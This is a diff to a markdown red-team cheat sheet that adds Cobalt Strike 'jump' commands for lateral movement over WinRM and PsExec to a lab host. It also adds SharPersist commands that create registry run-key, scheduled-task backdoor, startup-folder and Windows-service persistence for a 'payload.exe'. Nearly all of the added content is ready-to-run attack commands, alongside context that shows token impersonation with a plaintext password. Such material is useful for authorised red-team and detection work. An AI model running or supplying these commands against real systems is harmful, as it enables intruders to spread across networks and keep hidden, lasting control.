@@ -77,6 +77,15 @@ execute-assembly C:\Watson.exe
 ```
 ------------------------------------------------------------------------------------------
 ## Lateral Movement
+Cobalt Strike jumping
+```
+# Jump using WinRM if it's enabled for the current user on the target system
+jump winrm64 ops-jumpbox.lab.com HTTPSLISTENER
+
+# Jump using PsExec if it's enabled for the current user on the target system
+jump psexec64 ops-jumpbox.lab.com HTTPSLISTENER
+```
+
 Enable Powershell Remoting manually
 ```
 # Enable on local system with Admin privileges
@@ -101,7 +110,7 @@ powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-jumpbox.lab.
 
 # Now we can move laterally in CS with WinRM for the specified user
 make_token AD\testuser password
-jump [winrm/winrm64] ops-jumpbox.lab.com LISTENER
+jump [winrm/winrm64] ops-jumpbox.lab.com HTTPSLISTENER
 ```
 
 [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) - PS tools to perform SMB and WMI pass-the-hash attacks
@@ -274,6 +283,24 @@ execute-assembly C:\Sharpstay.exe action=UserRegistryKey keyname=Debug keypath=H
 
 # Many other methods available on the tool's github documentation
 ```
+[SharpPersist](https://github.com/fireeye/SharPersist)
+```
+# List persistence entries
+execute-assembly C:\SharPersist.exe -t [reg,schtaskbackdoor,startupfolder,service] -m list
+
+# Registy persistence
+execute-assembly C:\SharPersist.exe -t reg -c "C:\Windows\System32\cmd.exe" -a "/c payload.exe" -k "hkcurun" -v "Test Payload" -m add -o env
+
+# Scheduled task backdoor persistence
+execute-assembly C:\SharPersist.exe -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c payload.exe" -n "Test Scheduled Task" -m add -o daily
+
+# Startup folder persistence
+execute-assembly C:\SharPersist.exe -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c payload.exe" -f "Test File on Startup" -m add
+
+# Windows service persistence
+execute-assembly C:\SharPersist.exe -t service -c "C:\Windows\System32\cmd.exe" -a "/c payload.exe" -n "Test Service" -m add
+```
+
 [StayKit](https://github.com/0xthirteen/StayKit) - Cobalt Strike persistence kit aggressor script
 
 ------------------------------------------------------------------------------------------
